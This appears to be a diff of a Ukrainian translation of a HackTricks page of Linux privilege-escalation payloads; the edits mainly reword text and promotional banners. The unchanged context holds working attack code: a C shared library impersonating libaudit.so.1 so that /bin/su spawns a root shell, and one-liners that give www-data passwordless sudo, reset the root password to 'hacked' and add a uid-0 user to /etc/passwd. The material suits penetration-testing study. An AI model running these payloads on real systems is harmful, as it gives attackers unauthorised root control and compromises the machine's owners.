@@ -1,16 +1,19 @@
-# Пейлоуди для виконання
+# Payloads to execute
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Чи працюєте ви в **кібербезпецівій компанії**? Хочете побачити вашу **компанію рекламовану на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Відкрийте [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Bash
 ```bash
@@ -54,18 +57,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Перезапис файлу для підвищення привілеїв
+## Перезапис файлу для ескалації привілеїв
 
 ### Загальні файли
 
 * Додати користувача з паролем до _/etc/passwd_
-* Змінити пароль всередині _/etc/shadow_
+* Змінити пароль у _/etc/shadow_
 * Додати користувача до sudoers у _/etc/sudoers_
-* Зловживання docker через сокет docker, зазвичай у _/run/docker.sock_ або _/var/run/docker.sock_
+* Зловживати docker через сокет docker, зазвичай у _/run/docker.sock_ або _/var/run/docker.sock_
 
 ### Перезапис бібліотеки
 
-Перевірте бібліотеку, яку використовує деякий виконуваний файл, у цьому випадку `/bin/su`:
+Перевірте бібліотеку, що використовується деяким бінарним файлом, у цьому випадку `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -77,8 +80,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-У цьому випадку спробуйте видаїть себе за `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Таким чином, перевірте функції цієї бібліотеки, які використовуються бінарним файлом **`su`**:
+У цьому випадку спробуємо видати себе за `/lib/x86_64-linux-gnu/libaudit.so.1`.\
+Отже, перевірте функції цієї бібліотеки, які використовуються бінарним файлом **`su`**:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -86,7 +89,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Символи `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` та `audit_fd` ймовірно з бібліотеки libaudit.so.1. Оскільки libaudit.so.1 буде перезаписана зловмисною спільною бібліотекою, ці символи повинні бути присутні у новій спільній бібліотеці, інакше програма не зможе знайти символ і завершить роботу.
+Символи `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` та `audit_fd` ймовірно походять з бібліотеки libaudit.so.1. Оскільки libaudit.so.1 буде перезаписано шкідливою спільною бібліотекою, ці символи повинні бути присутніми в новій спільній бібліотеці, інакше програма не зможе знайти символ і завершить роботу.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -108,9 +111,9 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Зараз, просто викликаючи **`/bin/su`**, ви отримаєте оболонку як root.
+Тепер, просто викликавши **`/bin/su`**, ви отримаєте оболонку як root.
 
-## Сценарії
+## Скрипти
 
 Чи можете ви змусити root виконати щось?
 
@@ -118,7 +121,7 @@ system("/bin/bash");
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **Зміна пароля root**
+### **Змінити пароль root**
 ```bash
 echo "root:hacked" | chpasswd
 ```
@@ -126,14 +129,17 @@ echo "root:hacked" | chpasswd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
+{% hint style="success" %}
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-* Ви працюєте в **кібербезпеці компанії**? Хочете, щоб ваша **компанія рекламувалася на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або групи [**телеграм**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
